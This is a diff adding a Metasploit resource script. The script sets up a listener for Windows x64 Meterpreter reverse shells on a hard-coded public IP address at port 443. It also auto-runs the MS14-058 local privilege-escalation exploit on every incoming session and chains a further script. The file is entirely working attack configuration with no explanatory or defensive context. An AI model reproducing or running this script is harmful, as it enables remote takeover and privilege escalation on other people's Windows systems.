@@ -1,0 +1,10 @@
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 54.152.203.153
+set lport 443
+
+set AutoRunScript exploit/windows/local/ms14_058_track_popup_menu lhost=54.152.203.153 lport=4444 target=1 AutoRunScript=/root/Desktop/runsecond.rc
+
+exploit -j
+
+
